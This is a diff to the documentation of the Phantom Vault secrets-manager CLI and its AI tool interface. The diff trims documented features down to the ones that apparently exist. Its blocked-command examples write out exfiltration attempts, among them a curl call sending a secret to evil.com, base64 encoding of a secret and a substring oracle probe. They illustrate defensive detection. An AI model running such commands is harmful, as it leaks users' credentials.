@@ -277,31 +277,7 @@ ryan@macbook ~ % phantom init
   Your vault is ready.
 ```
 
-**Without biometric, using `--no-biometric` flag:**
-
-```
-ryan@macbook ~ % phantom init --no-biometric
-
-  🔐 Phantom Vault — Initialization
-
-  Biometric authentication disabled.
-  Using password-only mode.
-
-  Create a master password: ••••••••••••••••
-  Confirm password: ••••••••••••••••
-
-  ✓ Vault created (password-only mode)
-```
-
-**With a custom default namespace:**
-
-```
-ryan@macbook ~ % phantom init --namespace ib365
-
-  🔐 Phantom Vault — Initialization
-  ...
-  ✓ Default namespace set to 'ib365'
-```
+> **Enabling Touch ID.** Pass `--biometric` to `phantom init` (macOS only) to enable Touch ID unlock at creation, or run `phantom biometric enable` later. Those are the only ways to turn it on — there is no `--no-biometric` flag; password-only is simply the default when no Secure Enclave/biometric is available.
 
 ---
 
@@ -317,7 +293,6 @@ ryan@macbook ~ % phantom add STRIPE_SECRET_KEY
 
   ✓ Secret STRIPE_SECRET_KEY stored
     Namespace:  default
-    Sensitivity: medium
     Expires:    never
 ```
 
@@ -332,9 +307,9 @@ ryan@macbook ~ % phantom list
 
   SECRETS IN NAMESPACE: default
 
-  NAME                  CREATED      EXPIRES   SENSITIVITY  TAGS   ACCESSED
-  ─────────────────────────────────────────────────────────────────────────
-  STRIPE_SECRET_KEY     2026-02-27   never     medium       —      0 times
+  NAME                  CREATED      EXPIRES   ACCESSED
+  ──────────────────────────────────────────────────────
+  STRIPE_SECRET_KEY     2026-02-27   never     0 times
 ```
 
 ---
@@ -373,7 +348,7 @@ You: "What secrets do I have available?"
 
 Claude: I can see you have the following secrets available:
 
-  • STRIPE_SECRET_KEY (created 2026-02-27, medium sensitivity)
+  • STRIPE_SECRET_KEY (created 2026-02-27)
 
 Would you like me to use any of these for a task?
 ```
@@ -393,21 +368,18 @@ ryan@macbook ~ % phantom add DATABASE_URL
 
   ✓ Secret DATABASE_URL stored
     Namespace:  default
-    Sensitivity: medium
 ```
 
-### Add with All Options
+### Add with Options
 
 ```
-ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --tags prod,auth --expires 90d --sensitivity high
+ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --expires 90d
 
   Enter secret value: ••••••••••••••••••••••••••••
 
   ✓ Secret CLERK_SECRET_KEY stored
     Namespace:   ib365
-    Tags:        prod, auth
     Expires:     2026-05-28 (90 days)
-    Sensitivity: high (requires human confirmation for AI access)
 ```
 
 ### Every Flag Explained
@@ -415,66 +387,49 @@ ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --tags prod,auth
 ```
 ryan@macbook ~ % phantom add --help
 
-USAGE:
-  phantom add <KEY_NAME> [OPTIONS]
+Add a secret to the vault
 
-ARGUMENTS:
-  <KEY_NAME>    Name for the secret (e.g., STRIPE_SECRET_KEY)
+Usage: phantom add [OPTIONS] <NAME>
 
-OPTIONS:
-  --namespace <name>        Which namespace to store in
-                            Default: your configured default namespace
-                            Example: --namespace ib365
+Arguments:
+  <NAME>  Name of the secret
 
-  --tags <tag1,tag2>        Comma-separated labels for organization
-                            Example: --tags prod,payments,stripe
-
-  --expires <duration>      When this secret should expire
-                            Formats: 30d, 90d, 1y, 2026-12-31
-                            Default: never
-                            Example: --expires 90d
-
-  --sensitivity <level>     Access control level
-                            Choices: low, medium, high
-                            Default: medium
-                            - low:    AI can access freely
-                            - medium: AI can access, logged
-                            - high:   AI access requires your confirmation
-                            Example: --sensitivity high
-
-  --from-stdin              Read value from a pipe instead of prompting
-                            Example: cat key.txt | phantom add KEY --from-stdin
-
-  --help                    Show this help message
+Options:
+      --from-env <FROM_ENV>    Import from environment variable
+      --expires <EXPIRES>      Set expiration (e.g., 7d, 30d, 90d)
+      --namespace <NAMESPACE>  Namespace for this secret
+  -h, --help                   Print help
 ```
 
-### Add from a Pipe (Advanced)
+- `--from-env <VAR>` — read the value from an existing environment variable instead of prompting.
+- `--expires <duration>` — when the secret should expire (e.g. `7d`, `30d`, `90d`). Default: never.
+- `--namespace <name>` — which namespace to store it in. Default: your configured default namespace.
 
-If you have a key in a file or from another command:
+### Add from an Environment Variable
 
-```
-ryan@macbook ~ % cat ~/my_stripe_key.txt | phantom add STRIPE_KEY --from-stdin
-
-  ✓ Secret STRIPE_KEY stored (read from stdin)
-```
+If a key is already in an environment variable, import it without typing it:
 
 ```
-ryan@macbook ~ % echo "sk_live_abc123xyz" | phantom add STRIPE_KEY --from-stdin
+ryan@macbook ~ % export TEMP_KEY="sk_live_abc123xyz"
+ryan@macbook ~ % phantom add STRIPE_KEY --from-env TEMP_KEY
 
-  ✓ Secret STRIPE_KEY stored (read from stdin)
+  ✓ Secret STRIPE_KEY stored (read from $TEMP_KEY)
+
+ryan@macbook ~ % unset TEMP_KEY
 ```
 
 ### What NOT to Do
 
 ```
 # ❌ NEVER DO THIS — the value is visible in your terminal history
-ryan@macbook ~ % phantom add STRIPE_KEY --value sk_live_abc123xyz
-Error: --value flag does not exist. Secret values are never passed as arguments.
-       Use the interactive prompt or --from-stdin instead.
+ryan@macbook ~ % phantom add STRIPE_KEY sk_live_abc123xyz
+# There is no way to pass a value as an argument. Secret values are never
+# passed on the command line — use the hidden interactive prompt or --from-env.
 
 # ❌ NEVER DO THIS — visible in process listings and logs
-ryan@macbook ~ % STRIPE_KEY=sk_live_abc123 phantom add STRIPE_KEY
-Error: Secret values must not be passed via environment variables to the add command.
+ryan@macbook ~ % STRIPE_KEY=sk_live_abc123 phantom add STRIPE_KEY --from-env STRIPE_KEY
+# Piping a live secret through a throwaway shell variable is fine (see above),
+# but never inline it on the same line as the command.
 ```
 
 ---
@@ -488,27 +443,16 @@ ryan@macbook ~ % phantom list
 
   SECRETS IN NAMESPACE: default
 
-  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
-  ────────────────────────────────────────────────────────────────────────────────────────
-  STRIPE_SECRET_KEY     2026-02-27   never        medium       —               3 times
-  DATABASE_URL          2026-02-27   2026-05-28   high         prod,db         12 times
-  RAILWAY_TOKEN         2026-02-27   never        medium       deploy          1 time
-  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
-  ELEVENLABS_API_KEY    2026-02-27   never        low          voice           0 times
+  NAME                  CREATED      EXPIRES      ACCESSED
+  ──────────────────────────────────────────────────────────
+  STRIPE_SECRET_KEY     2026-02-27   never        3 times
+  DATABASE_URL          2026-02-27   2026-05-28   12 times
+  RAILWAY_TOKEN         2026-02-27   never        1 time
+  CLERK_SECRET_KEY      2026-02-27   2026-05-28   7 times
+  ELEVENLABS_API_KEY    2026-02-27   never        0 times
 ```
 
-### List with Filters
-
-```
-ryan@macbook ~ % phantom list --tags prod
-
-  SECRETS IN NAMESPACE: default (filtered: tag=prod)
-
-  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
-  ────────────────────────────────────────────────────────────────────────────────────────
-  DATABASE_URL          2026-02-27   2026-05-28   high         prod,db         12 times
-  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
-```
+`phantom list` shows secret **names only** — never values. It takes a single flag, `-n`/`--namespace`, to list a different namespace.
 
 ### List in a Specific Namespace
 
@@ -517,64 +461,28 @@ ryan@macbook ~ % phantom list --namespace ib365
 
   SECRETS IN NAMESPACE: ib365
 
-  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
-  ────────────────────────────────────────────────────────────────────────────────────────
-  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
-  NEON_DB_URL           2026-02-27   never        high         prod,db         4 times
-```
-
-### List as JSON (for Scripts)
-
-```
-ryan@macbook ~ % phantom list --format json
-[
-  {
-    "name": "STRIPE_SECRET_KEY",
-    "namespace": "default",
-    "created": "2026-02-27T14:32:01Z",
-    "expires": null,
-    "sensitivity": "medium",
-    "tags": [],
-    "access_count": 3
-  },
-  ...
-]
+  NAME                  CREATED      EXPIRES      ACCESSED
+  ──────────────────────────────────────────────────────────
+  CLERK_SECRET_KEY      2026-02-27   2026-05-28   7 times
+  NEON_DB_URL           2026-02-27   never        4 times
 ```
 
 ### Show Details for One Secret
 
 ```
-ryan@macbook ~ % phantom show STRIPE_SECRET_KEY
+ryan@macbook ~ % phantom show STRIPE_SECRET_KEY --masked
 
   SECRET: STRIPE_SECRET_KEY
 
   Namespace:    default
   Created:      2026-02-27 14:32:01 UTC
   Expires:      never
-  Sensitivity:  medium
-  Tags:         (none)
   Accessed:     3 times
   Last access:  2026-02-27 16:45:22 UTC
   Value:        ••••••••••••rXYZ  (last 4 characters only)
 ```
 
-> **Why only the last 4?** So you can confirm it's the right key without exposing the full value. This is the same approach Stripe's dashboard uses.
-
-### Show Details in a Specific Namespace
-
-```
-ryan@macbook ~ % phantom show CLERK_SECRET_KEY --namespace ib365
-
-  SECRET: CLERK_SECRET_KEY
-
-  Namespace:    ib365
-  Created:      2026-02-27 14:35:00 UTC
-  Expires:      2026-05-28 14:35:00 UTC (90 days remaining)
-  Sensitivity:  high
-  Tags:         prod, auth
-  Accessed:     7 times
-  Value:        ••••••••••••k4Wz  (last 4 characters only)
-```
+> **Why only the last 4?** So you can confirm it's the right key without exposing the full value. This is the same approach Stripe's dashboard uses. Pass `--masked` to reveal those last 4 characters.
 
 ### Get the Full Value (Human Only — Requires Biometric)
 
@@ -609,21 +517,19 @@ ryan@macbook ~ % phantom get STRIPE_SECRET_KEY | cat
 ```
 ryan@macbook ~ % phantom get --help
 
-USAGE:
-  phantom get <KEY_NAME> [OPTIONS]
+Get a secret value (requires authentication)
 
-ARGUMENTS:
-  <KEY_NAME>    Name of the secret to retrieve
+Usage: phantom get <NAME>
 
-OPTIONS:
-  --namespace <name>    Namespace to retrieve from
-                        Default: your configured default namespace
+Arguments:
+  <NAME>  Name of the secret
 
-  --help                Show this help message
+Options:
+  -h, --help  Print help
 
 SECURITY:
   This command REQUIRES:
-  ✓ Biometric authentication (Touch ID, YubiKey, or password)
+  ✓ Authentication (Touch ID / biometric, or master password)
   ✓ A real terminal session (isatty check)
 
   This command CANNOT be called by:
@@ -694,7 +600,7 @@ ryan@macbook ~ % phantom mcp uninstall
 ┌──────────────────────────────────────────────────────────────────────┐
 │                    WHAT CLAUDE CAN DO                                │
 ├──────────────────────────────────────────────────────────────────────┤
-│  ✓ vault_list    — See names, tags, expiration dates                │
+│  ✓ vault_list    — See names and expiration dates                   │
 │  ✓ vault_exists  — Check if a specific secret exists                │
 │  ✓ vault_masked  — See last 4 characters: ••••••rXYZ               │
 │  ✓ vault_run     — Execute a command with secrets injected          │
@@ -719,13 +625,12 @@ ryan@macbook ~ % phantom mcp uninstall
 
 ### Basic Usage
 
-This runs a command with your secret injected as an environment variable:
+This runs a command with your secret injected as an environment variable. Name the secret with `-s NAME`, then put the command after `--`:
 
 ```
-ryan@macbook ~ % phantom run --keys STRIPE_SECRET_KEY -- stripe customers list
+ryan@macbook ~ % phantom run -s STRIPE_SECRET_KEY -- stripe customers list
 
   ✓ Command analyzed: SAFE
-  ✓ Sandbox: network restricted to api.stripe.com
   ✓ Secret injected: STRIPE_SECRET_KEY
   ✓ Executing: stripe customers list
 
@@ -736,17 +641,19 @@ ryan@macbook ~ % phantom run --keys STRIPE_SECRET_KEY -- stripe customers list
     ]
   }
 
-  ✓ Output sanitized (0 redactions)
   ✓ Secret memory zeroed
 ```
 
+The subprocess runs under a Landlock filesystem sandbox. Automatic output scanning/redaction is in the codebase but not yet independently verified — treat it as planned.
+
 ### Multiple Secrets
 
+Pass `-s` once per secret:
+
 ```
-ryan@macbook ~ % phantom run --keys RAILWAY_TOKEN,DATABASE_URL -- railway deploy
+ryan@macbook ~ % phantom run -s RAILWAY_TOKEN -s DATABASE_URL -- railway deploy
 
   ✓ Command analyzed: SAFE
-  ✓ Sandbox: network restricted to railway.app
   ✓ Secrets injected: RAILWAY_TOKEN, DATABASE_URL
   ✓ Executing: railway deploy
 
@@ -754,62 +661,26 @@ ryan@macbook ~ % phantom run --keys RAILWAY_TOKEN,DATABASE_URL -- railway deploy
   Build completed in 42s
   Deploy live at https://myapp.up.railway.app
 
-  ✓ Output sanitized (0 redactions)
   ✓ Secret memory zeroed
 ```
 
-### With Domain Restriction
+### Inject Under a Different Variable Name
+
+Use `-s NAME=ENV_VAR` to expose a secret to the subprocess under a different environment-variable name:
 
 ```
-ryan@macbook ~ % phantom run --keys API_KEY --allow-domains api.stripe.com -- curl -H "Authorization: Bearer $API_KEY" https://api.stripe.com/v1/charges
+ryan@macbook ~ % phantom run -s MY_KEY=CUSTOM_VAR -- env
 
-  ✓ Command analyzed: SAFE
-  ✓ Sandbox: network restricted to api.stripe.com ONLY
-  ✓ Secret injected: API_KEY
-  ✓ Executing: curl...
-
-  {"data": [...]}
-
-  ✓ Output sanitized (0 redactions)
-```
-
-### With Timeout
-
-```
-ryan@macbook ~ % phantom run --keys DB_URL --timeout 60 -- python migrate.py
-
-  ✓ Command analyzed: SAFE
-  ✓ Timeout: 60 seconds
-  ✓ Executing: python migrate.py
-
-  Running migrations...
-  Applied 3 migrations in 12.4s
-
-  ✓ Complete
-```
-
-### Dry Run (Check Without Executing)
-
-```
-ryan@macbook ~ % phantom run --keys API_KEY --dry-run -- curl -H "Auth: Bearer $API_KEY" https://api.stripe.com/v1/charges
-
-  DRY RUN — Command will NOT be executed.
-
-  Analysis result: ✓ ALLOWED
-
-  Command:     curl -H "Auth: Bearer $API_KEY" https://api.stripe.com/v1/charges
-  Secrets:     API_KEY
-  Network:     api.stripe.com (allowed)
-  Risk score:  0/100
-  Patterns:    none detected
-
-  This command would be safe to execute.
+  ✓ Secret MY_KEY injected as CUSTOM_VAR
+  ✓ Executing: env
 ```
 
 ### When a Command Gets BLOCKED
 
+The command analyzer inspects each command before it runs and refuses ones that would leak a secret:
+
 ```
-ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY
+ryan@macbook ~ % phantom run -s API_KEY -- echo $API_KEY
 
   ✗ BLOCKED: Direct Access
 
@@ -818,13 +689,10 @@ ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY
 
   Detected pattern: DIRECT_ACCESS — echo with secret variable reference
   Risk score: 100/100
-
-  If this is a legitimate command, adjust your policy:
-    phantom policy allow-pattern 'echo $API_KEY'
 ```
 
 ```
-ryan@macbook ~ % phantom run --keys API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = "s" ]; then echo YES; fi'
+ryan@macbook ~ % phantom run -s API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = "s" ]; then echo YES; fi'
 
   ✗ BLOCKED: Oracle Attack — Substring Extraction
 
@@ -840,7 +708,7 @@ ryan@macbook ~ % phantom run --keys API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = 
 ```
 
 ```
-ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY | base64
+ryan@macbook ~ % phantom run -s API_KEY -- bash -c 'echo $API_KEY | base64'
 
   ✗ BLOCKED: Encoding Exfiltration
 
@@ -852,40 +720,14 @@ ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY | base64
 ```
 
 ```
-ryan@macbook ~ % phantom run --keys API_KEY -- curl "https://evil.com?stolen=$API_KEY"
+ryan@macbook ~ % phantom run -s API_KEY -- curl "https://evil.com?stolen=$API_KEY"
 
   ✗ BLOCKED: Network Exfiltration
 
   The command embeds the secret value in a URL, which would send it
-  to an external server. The domain 'evil.com' is not in your
-  allowed domains list.
+  to an external server.
 
   Detected pattern: NETWORK_EXFILTRATION — secret in URL query parameter
-```
-
-### Without Sandbox (Not Recommended)
-
-```
-ryan@macbook ~ % phantom run --keys API_KEY --no-sandbox -- some-command
-
-  ⚠ WARNING: Running without sandbox. Network is unrestricted.
-  ⚠ The command can connect to any server.
-  ⚠ Use --allow-domains for safer execution.
-
-  Proceed? [y/N]: y
-
-  ✓ Executing without sandbox...
-```
-
-### From a Specific Namespace
-
-```
-ryan@macbook ~ % phantom run --keys CLERK_SECRET_KEY --namespace ib365 -- node deploy.js
-
-  ✓ Using namespace: ib365
-  ✓ Command analyzed: SAFE
-  ✓ Executing: node deploy.js
-  ...
 ```
 
 ### Every Flag for `phantom run`
@@ -893,41 +735,24 @@ ryan@macbook ~ % phantom run --keys CLERK_SECRET_KEY --namespace ib365 -- node d
 ```
 ryan@macbook ~ % phantom run --help
 
-USAGE:
-  phantom run --keys <KEY1,KEY2,...> [OPTIONS] -- <COMMAND>
+Run a command with secrets injected as environment variables
 
-  Everything after -- is the command to execute.
+Usage: phantom run [OPTIONS] [-- <COMMAND>...]
 
-REQUIRED:
-  --keys <KEY1,KEY2>      Comma-separated secret names to inject
-                          These become environment variables in the subprocess
+Arguments:
+  [COMMAND]...  Command and arguments
 
-OPTIONS:
-  --namespace <name>      Namespace to pull secrets from
-                          Default: your configured default namespace
-
-  --timeout <seconds>     Maximum execution time before killing the process
-                          Default: 30 seconds
-                          Example: --timeout 60
-
-  --allow-domains <list>  Comma-separated domains the command can reach
-                          All other outbound connections are blocked
-                          Example: --allow-domains api.stripe.com,api.clerk.com
-
-  --no-sandbox            Skip process sandboxing (NOT recommended)
-                          Use only if sandbox is incompatible with your command
-
-  --dry-run               Analyze the command without executing it
-                          Shows whether it would be allowed or blocked
-
-  --help                  Show this help message
+Options:
+  -s, --secret <SECRET>  Secrets to inject (use -s NAME or -s NAME=ENV_VAR)
+  -h, --help             Print help
 
 EXAMPLES:
-  phantom run --keys STRIPE_KEY -- stripe charges list
-  phantom run --keys DB_URL,API_KEY --timeout 60 -- python script.py
-  phantom run --keys TOKEN --allow-domains railway.app -- railway deploy
-  phantom run --keys KEY --dry-run -- curl https://api.example.com
+  phantom run -s API_KEY -- curl https://api.example.com
+  phantom run -s DB_URL -s REDIS_URL -- node server.js
+  phantom run -s MY_KEY=CUSTOM_VAR -- env   # inject as CUSTOM_VAR
 ```
+
+Everything after `--` is the command to execute. `phantom run` takes exactly one option — `-s`/`--secret` — repeated once per secret. There is no `--namespace`, `--timeout`, `--allow-domains`, `--no-sandbox`, or `--dry-run` flag.
 
 ---
 
@@ -944,7 +769,6 @@ ryan@macbook ~ % phantom namespace create ib365
   🔐 Authenticate...
 
   ✓ Namespace 'ib365' created
-  ✓ Canary secret auto-planted
 ```
 
 ### List All Namespaces
@@ -964,7 +788,7 @@ ryan@macbook ~ % phantom namespace list
 ### Switch Default Namespace
 
 ```
-ryan@macbook ~ % phantom namespace switch ib365
+ryan@macbook ~ % phantom namespace use ib365
 
   ✓ Default namespace changed to 'ib365'
   All commands will now use 'ib365' unless --namespace is specified.
@@ -1022,27 +846,7 @@ ryan@macbook ~ % phantom health
 
 ### Rotate a Secret
 
-**For supported vendors (auto-rotation):**
-
-```
-ryan@macbook ~ % phantom rotate STRIPE_SECRET_KEY
-
-  [Touch ID prompt]
-  🔐 Authenticate...
-
-  Rotating STRIPE_SECRET_KEY...
-
-  ✓ Contacted Stripe API
-  ✓ New key generated by Stripe
-  ✓ Old key revoked
-  ✓ New key stored in vault
-  ✓ Audit log updated
-
-  New value: ••••••••••••nP4Q (last 4 chars)
-  Previous value has been revoked by Stripe.
-```
-
-**For other vendors (manual):**
+`phantom rotate` replaces a secret's value with a new one. It prompts you for the new value (hidden, like `phantom add`), then overwrites the old value and zeroes it from memory. Phantom does not contact the vendor's API — generate the new key at the provider first, then rotate it in:
 
 ```
 ryan@macbook ~ % phantom rotate ELEVENLABS_API_KEY
@@ -1050,33 +854,14 @@ ryan@macbook ~ % phantom rotate ELEVENLABS_API_KEY
   [Touch ID prompt]
   🔐 Authenticate...
 
-  Phantom Vault cannot auto-rotate ElevenLabs keys.
-
-  Steps:
-  1. Go to elevenlabs.io → Profile → API Keys
-  2. Generate a new key
-  3. Enter the new key below
+  Rotating ELEVENLABS_API_KEY...
+  (generate a fresh key at your provider first, then paste it below)
 
   Enter new value: ••••••••••••••••••••••••••••
 
   ✓ New value stored
   ✓ Old value overwritten and zeroed from memory
   ✓ Audit log updated
-```
-
-### Rotate in a Specific Namespace
-
-```
-ryan@macbook ~ % phantom rotate CLERK_SECRET_KEY --namespace ib365
-
-  [Touch ID prompt]
-  🔐 Authenticate...
-
-  Rotating CLERK_SECRET_KEY in namespace 'ib365'...
-  ✓ Contacted Clerk API
-  ✓ New key generated
-  ✓ Old key revoked
-  ✓ Stored and logged
 ```
 
 ---
@@ -1087,111 +872,38 @@ Every action in Phantom Vault is logged in a tamper-evident chain. Each entry's 
 
 ### View Recent Activity
 
+`phantom audit` prints the audit log, most recent last. By default it shows the last 20 entries; use `--last N` to change how many:
+
 ```
-ryan@macbook ~ % phantom audit tail
+ryan@macbook ~ % phantom audit
 
-  RECENT AUDIT ENTRIES (last 10)
+  RECENT AUDIT ENTRIES (last 20)
 
-  TIMESTAMP             TOOL          KEY                  TRUST        RESULT
-  ──────────────────────────────────────────────────────────────────────────────
-  2026-02-27 16:45:22   vault_run     STRIPE_SECRET_KEY    LLM_APPROVED ✓ success
-  2026-02-27 16:44:01   vault_list    —                    LLM_APPROVED ✓ success
-  2026-02-27 16:43:50   vault_run     DATABASE_URL         LLM_AUTO     ✗ blocked (oracle)
-  2026-02-27 16:40:11   vault_masked  STRIPE_SECRET_KEY    LLM_APPROVED ✓ success
-  2026-02-27 16:38:00   vault_health  —                    HUMAN_DIRECT ✓ success
+  TIMESTAMP             TOOL          KEY                  RESULT
+  ────────────────────────────────────────────────────────────────────
+  2026-02-27 16:45:22   vault_run     STRIPE_SECRET_KEY    ✓ success
+  2026-02-27 16:44:01   vault_list    —                    ✓ success
+  2026-02-27 16:43:50   vault_run     DATABASE_URL         ✗ blocked (oracle)
+  2026-02-27 16:40:11   vault_masked  STRIPE_SECRET_KEY    ✓ success
+  2026-02-27 16:38:00   vault_health  —                    ✓ success
   ...
 ```
 
-### View More Lines
+### Show More (or Fewer) Entries
 
 ```
-ryan@macbook ~ % phantom audit tail --lines 50
-  (shows last 50 entries)
+ryan@macbook ~ % phantom audit --last 50
+  (shows the last 50 entries)
 ```
 
-### Search by Secret Name
+`--last N` is the only flag `phantom audit` takes. It does not have `tail`, `search`, `verify`, or `export` subcommands — pipe the output to standard tools (`grep`, `less`) if you want to filter or save it:
 
 ```
-ryan@macbook ~ % phantom audit search --key STRIPE_SECRET_KEY
-
-  AUDIT ENTRIES FOR: STRIPE_SECRET_KEY
-
-  TIMESTAMP             TOOL          TRUST         RESULT
-  ────────────────────────────────────────────────────────────
-  2026-02-27 16:45:22   vault_run     LLM_APPROVED  ✓ success (stripe charges list)
-  2026-02-27 16:40:11   vault_masked  LLM_APPROVED  ✓ success
-  2026-02-27 15:30:00   vault_run     LLM_APPROVED  ✓ success (stripe customers list)
-
-  3 entries found
+ryan@macbook ~ % phantom audit --last 200 | grep STRIPE_SECRET_KEY
+ryan@macbook ~ % phantom audit --last 500 > audit_backup.txt
 ```
 
-### Search by Trust Level
-
-```
-ryan@macbook ~ % phantom audit search --trust-level LLM_AUTO
-
-  AUDIT ENTRIES WITH TRUST: LLM_AUTO
-
-  TIMESTAMP             TOOL          KEY                RESULT
-  ───────────────────────────────────────────────────────────────
-  2026-02-27 16:43:50   vault_run     DATABASE_URL       ✗ blocked
-  2026-02-27 15:20:00   vault_list    —                  ✓ success
-
-  Trust level explanation:
-    HUMAN_DIRECT  — You ran this command directly
-    LLM_APPROVED  — AI requested, you were recently active
-    LLM_AUTO      — AI requested, no recent human interaction
-```
-
-### Search by Date
-
-```
-ryan@macbook ~ % phantom audit search --since 2026-02-01
-
-  (shows all entries since February 1, 2026)
-```
-
-### Verify Audit Chain Integrity
-
-```
-ryan@macbook ~ % phantom audit verify
-
-  Verifying HMAC chain integrity...
-
-  Entries checked: 847
-  Chain status:    ✓ VALID — no tampering detected
-
-  Every entry's HMAC is consistent with the previous entry.
-  The audit log has not been modified.
-```
-
-**If tampering is detected:**
-
-```
-ryan@macbook ~ % phantom audit verify
-
-  Verifying HMAC chain integrity...
-
-  Entries checked: 847
-  Chain status:    ✗ BROKEN at entry #423
-
-  ⚠ ALERT: The audit chain is broken between entries #422 and #423.
-  This means one of these entries was modified or deleted after creation.
-
-  Entry #422: 2026-02-20 14:00:00 vault_run STRIPE_KEY ✓
-  Entry #423: 2026-02-20 14:05:00 vault_list — ✓  ← HMAC mismatch
-
-  Action required: Investigate this time window immediately.
-  Export the log for analysis: phantom audit export --format json > audit.json
-```
-
-### Export Audit Log
-
-```
-ryan@macbook ~ % phantom audit export --format json > audit_backup.json
-
-  ✓ Exported 847 entries to audit_backup.json
-```
+> **Tamper-evidence.** A tamper-evident HMAC-chained audit log is in the codebase but not yet independently verified — treat the tamper-evidence as planned. `phantom health` reports the chain's status as part of its check.
 
 ---
 
@@ -1203,31 +915,19 @@ The key feature: canary secrets are **indistinguishable** from real secrets in t
 
 ### Create a Canary
 
+Give the canary a name, and optionally a `--pattern` so its fake value looks like a real key of that type (e.g. `aws-access-key`, `stripe-key`):
+
 ```
-ryan@macbook ~ % phantom canary create
+ryan@macbook ~ % phantom canary create BACKUP_AWS_ACCESS_KEY --pattern aws-access-key
 
   [Touch ID prompt]
   🔐 Authenticate...
 
   ✓ Canary created: BACKUP_AWS_ACCESS_KEY
-    Namespace: default
     Value looks like: AKIA••••••••••••7X2F (realistic AWS key format)
     Trigger: alert on any access via vault_run
 
   This canary is now indistinguishable from a real secret in vault_list.
-```
-
-### Create Canary in a Specific Namespace
-
-```
-ryan@macbook ~ % phantom canary create --namespace ib365
-
-  [Touch ID prompt]
-  🔐 Authenticate...
-
-  ✓ Canary created: OLD_STRIPE_TEST_KEY
-    Namespace: ib365
-    Value looks like: sk_test_••••••••••••8mNp (realistic Stripe key format)
 ```
 
 ### List Canaries
@@ -1244,62 +944,15 @@ ryan@macbook ~ % phantom canary list
   LEGACY_GITHUB_TOKEN       default      GitHub       active      never
 ```
 
-### Check Canary Status
+### Delete a Canary
 
 ```
-ryan@macbook ~ % phantom canary status
+ryan@macbook ~ % phantom canary delete BACKUP_AWS_ACCESS_KEY
 
-  CANARY STATUS
-
-  Total canaries:  3
-  Active:          3
-  Triggered:       0
-
-  ✓ No exfiltration attempts detected.
+  ✓ Canary 'BACKUP_AWS_ACCESS_KEY' deleted
 ```
 
-**If a canary has been triggered:**
-
-```
-ryan@macbook ~ % phantom canary status
-
-  CANARY STATUS
-
-  Total canaries:  3
-  Active:          3
-  Triggered:       1 ← ⚠ ALERT
-
-  ⚠ CANARY TRIGGERED: BACKUP_AWS_ACCESS_KEY
-    When:       2026-02-27 16:43:50 UTC
-    Tool:       vault_run
-    Command:    curl -H "Authorization: $BACKUP_AWS_ACCESS_KEY" ...
-    Trust:      LLM_AUTO
-    Namespace:  default
-
-  RECOMMENDED ACTIONS:
-  1. Review the full audit log around this time
-  2. Check what MCP client initiated the request
-  3. Rotate all real secrets in this namespace
-  4. Investigate the conversation context
-```
-
-### Set Alert Webhook
-
-```
-ryan@macbook ~ % phantom canary set-webhook https://hooks.slack.com/services/T00/B00/xxxx
-
-  ✓ Webhook URL set
-  ✓ Test alert sent — check your Slack channel
-
-  When any canary is triggered, a POST request will be sent to this URL with:
-  {
-    "alert": "canary_triggered",
-    "canary": "BACKUP_AWS_ACCESS_KEY",
-    "timestamp": "2026-02-27T16:43:50Z",
-    "tool": "vault_run",
-    "trust_level": "LLM_AUTO"
-  }
-```
+> **Where triggers show up.** `phantom canary` has three subcommands only — `create`, `list`, and `delete`. When a canary is touched, the event lands in the audit log (`phantom audit`) and is reflected in `phantom health`.
 
 ---
 
@@ -1338,36 +991,18 @@ ryan@macbook ~ % phantom policy show
     STRIPE_KEY:      only allowed with stripe, curl to api.stripe.com
 ```
 
-### Add an Allowed Domain
+### Change the Policy
+
+Policy changes are made by loading a policy file, not with per-rule commands. Write your rules to a file, then apply it with `phantom policy set <file>`:
 
 ```
-ryan@macbook ~ % phantom policy allow-domain api.elevenlabs.io
+ryan@macbook ~ % phantom policy set my-policy.toml
 
-  ✓ Added api.elevenlabs.io to allowed domains
+  ✓ Security policy updated from 'my-policy.toml'
   ✓ Policy re-signed
 ```
 
-### Block a Custom Pattern
-
-```
-ryan@macbook ~ % phantom policy block-pattern 'python -c'
-
-  ✓ Added block pattern: 'python -c'
-  ✓ Policy re-signed
-
-  Note: This blocks all Python one-liners. vault_run commands
-  containing 'python -c' will be rejected.
-```
-
-### Verify Policy Integrity
-
-```
-ryan@macbook ~ % phantom policy verify
-
-  ✓ Policy HMAC: valid
-  ✓ Policy has not been tampered with since last modification
-  ✓ Last modified: 2026-02-27 14:32:01 UTC
-```
+`phantom policy` has exactly three subcommands — `show`, `set`, and `reset`. There are no `allow-domain`, `block-pattern`, or `verify` subcommands; edit the policy file and re-apply it with `policy set`, or start over with `policy reset`.
 
 ### Reset to Defaults
 
@@ -1406,19 +1041,12 @@ require_biometric = true        # Require Touch ID / biometric
 default = "personal"            # Default namespace for new secrets
 allowed = ["personal", "ib365", "advancedpsych"]
 
-[sensitivity]
-# Secrets marked "high" require human confirmation for AI access
-high = ["DATABASE_URL", "STRIPE_SECRET_KEY", "CLERK_SECRET_KEY"]
-medium = ["RAILWAY_TOKEN", "VERCEL_TOKEN"]
-low = ["ELEVENLABS_API_KEY"]
-
 [rotation]
 warn_at_days = 60               # Warning when secret is this old
 critical_at_days = 90           # Critical warning threshold
 
 [canary]
 auto_create = true              # Auto-plant canaries in new namespaces
-webhook_url = ""                # Alert URL (Slack, email, etc.)
 
 [sandbox]
 default_timeout_seconds = 30    # Max command execution time
@@ -1434,11 +1062,9 @@ network_filtering = true        # Enable per-process network rules
 | `require_biometric` | Whether Touch ID / biometric is required | true |
 | `default` namespace | Which namespace new secrets go into | "personal" |
